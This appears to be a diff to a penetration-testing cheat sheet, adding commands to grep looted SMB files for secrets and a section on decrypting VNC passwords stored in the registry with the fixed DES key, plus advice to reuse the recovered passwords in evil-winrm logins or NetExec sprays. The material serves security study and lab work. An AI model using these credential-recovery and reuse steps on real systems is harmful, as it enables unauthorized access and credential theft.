@@ -46,6 +46,7 @@
     - [AppLocker bypass](#applocker-bypass)
     - [Unattended installation files](#unattended-installation-files)
     - [Registry Autologon Credentials](#registry-autologon-credentials)
+    - [VNC Stored Password Recovery](#vnc-stored-password-recovery)
     - [Windows Privilege Escalation Checklist](#windows-privilege-escalation-checklist)
 - [Password Cracking](#password-cracking)
   - [John the Ripper](#john-the-ripper)
@@ -264,6 +265,19 @@ smbget -R smb://<target>/<share>
 * `smbget`: Utility to download files from SMB shares
 * `-R`: Recursive flag - downloads all files and subdirectories
 * `smb://<target>/<share>`: Specifies the target IP and share name (e.g., `smb://10.81.182.140/anonymous`)
+
+* **Hunt for secrets in downloaded files** - Once a share is on disk, grep the whole tree instead of opening files one by one
+
+```bash
+grep -rniE "pass|pwd|secret|cred|token|api[_-]?key" ./loot 2>/dev/null
+```
+
+* `-r`: Recursive into subdirectories
+* `-n`: Show line numbers of matches
+* `-i`: Case-insensitive (catches `Password`, `PASSWORD`, etc.)
+* `-E`: Extended regex so one pass catches several keywords
+* `2>/dev/null`: Hide the flood of `Permission denied` noise
+* Also worth checking for credential-bearing file types specifically: `find ./loot -type f \( -iname '*.reg' -o -iname '*.config' -o -iname '*.xml' -o -iname '*.ini' -o -iname '*.ps1' -o -iname '*.kdbx' \)` - exported registry hives, app configs and scripts are where stored passwords usually hide (see [VNC Stored Password Recovery](#vnc-stored-password-recovery) for the classic `.reg` case)
 
 * **SMB Brute Force with CrackMapExec** - Performs brute force attack against SMB service using username list and password
 
@@ -1599,6 +1613,48 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
   * `DefaultPassword` — plaintext
 * **Important** — `DefaultUserName` is free text set manually by whoever configured autologon; it is **not guaranteed to match the exact `sAMAccountName`** in AD (abbreviations, display names, and typos are common). Confirm the real account name before burning attempts — see [RID brute force](#netexec-crackmapexec--ad) or [SID Enumeration (Impacket)](#sid-enumeration-impacket).
 * Registry ≠ event logs — this is **configuration storage** (settings, like a hierarchical database), not a time-ordered journal; `Get-EventLog` / Event Viewer is the actual Windows logging mechanism.
+
+#### VNC Stored Password Recovery
+
+* **What** — VNC servers (TightVNC, RealVNC, UltraVNC) store the connection password in the registry or a config file **DES-encrypted under a single, fixed, publicly known key** (`e84ad660c4721ae0`). This is obfuscation, not real encryption — the key is baked into the software, so the password is fully recoverable by anyone who reads the blob. Turns up as a `"Password"=hex:...` value under `HKLM\SOFTWARE\...\VNC...`, inside an exported `VNC Install.reg`, or in a `.ini`/`.vnc` file.
+
+```
+[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
+"UseVncAuthentication"=dword:00000001
+"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
+```
+
+* **Decrypt with Python** (strip the commas from the hex first):
+
+```bash
+python3 -c '
+from Crypto.Cipher import DES
+enc = bytes.fromhex("6bcf2a4b6e5aca0f")      # the "Password"=hex bytes, commas removed
+key = bytes.fromhex("e84ad660c4721ae0")      # VNC fixed DES key
+print(DES.new(key, DES.MODE_ECB).decrypt(enc))
+'
+```
+
+* `pip install pycryptodome` if the `Crypto` module is missing
+* `DES.MODE_ECB`: VNC encrypts the 8-byte password as a single ECB block — no IV involved
+* The printed bytes are the cleartext password (trailing null padding is normal)
+
+* **Decrypt with the dedicated tool** instead:
+
+```bash
+git clone https://github.com/jeroennijhof/vncpwd && (cd vncpwd && make)
+echo -n -e '\x6b\xcf\x2a\x4b\x6e\x5a\xca\x0f' > vncpass.bin
+./vncpwd/vncpwd vncpass.bin
+```
+
+* **Where to look on a live target** (if you have a shell rather than a looted file):
+
+```powershell
+reg query HKLM\SOFTWARE\TightVNC\Server /v Password
+reg query "HKCU\Software\ORL\WinVNC3" /v Password
+```
+
+* Recovered VNC passwords are frequently **reused** for the matching Windows/AD account — feed them straight into `evil-winrm -i <target> -u <user> -p '<pw>'` or a NetExec spray before assuming they're VNC-only.
 
 #### Windows Privilege Escalation Checklist
 
